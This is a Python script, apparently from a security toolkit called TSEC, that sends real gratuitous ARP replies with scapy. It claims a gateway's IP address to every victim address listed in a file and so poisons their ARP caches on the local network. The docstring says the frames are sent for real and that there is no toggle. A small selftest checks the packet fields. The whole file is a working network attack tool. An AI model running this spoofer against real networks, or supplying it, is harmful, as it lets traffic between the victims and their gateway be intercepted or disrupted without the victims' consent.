#!/usr/bin/env python3
"""Send real gratuitous ARP replies on the local network.

Builds the ARP is-at frames and transmits them on the interface. The
frames are the payload: there is no toggle. Without a real interface and
network this reduces to GENERATED, stated as such.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import Report, State, check, check_eq, selftest as engine_selftest

VERSION = "2.0.0"


def build(target_ip: str, spoof_ip: str, target_mac: str = "ff:ff:ff:ff:ff:ff"):
    from scapy.all import Ether, ARP
    return Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--iface")
    ap.add_argument("--gw", help="address to claim")
    ap.add_argument("--victims", help="file of victim IPs, one per line")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    if not args.iface or not args.gw or not args.victims:
        ap.error("--iface, --gw and --victims are required unless --selftest is given")
    report = Report("arp_spoof", VERSION, target=args.gw)
    victims = [ln.strip() for ln in Path(args.victims).read_text().splitlines() if ln.strip()]
    try:
        from scapy.all import sendp
    except ImportError:
        report.note("arp spoof", State.BLOCKED, "info", "scapy not installed")
        from tsec_engine import emit
        emit(report, args.json, None)
        return 0
    for victim in victims:
        try:
            sendp(build(victim, args.gw), iface=args.iface, count=2, verbose=False)
            report.note(f"gratuitous ARP to {victim}", State.USED, "high",
                        f"claimed {args.gw} is-at on {args.iface}")
        except Exception as exc:  # noqa: BLE001
            report.note(f"gratuitous ARP to {victim}", State.FAILED, "info", str(exc)[:200])
    from tsec_engine import emit
    emit(report, args.json, None)
    return 0


def selftest_fn() -> None:
    pkt = build("192.0.2.5", "192.0.2.1")
    from scapy.all import ARP
    check(pkt.haslayer(ARP), "must carry ARP")
    check_eq(pkt[ARP].psrc, "192.0.2.1")
    check_eq(pkt[ARP].op, 2)


def selftest() -> None:
    selftest_fn()


if __name__ == "__main__":
    sys.exit(main())
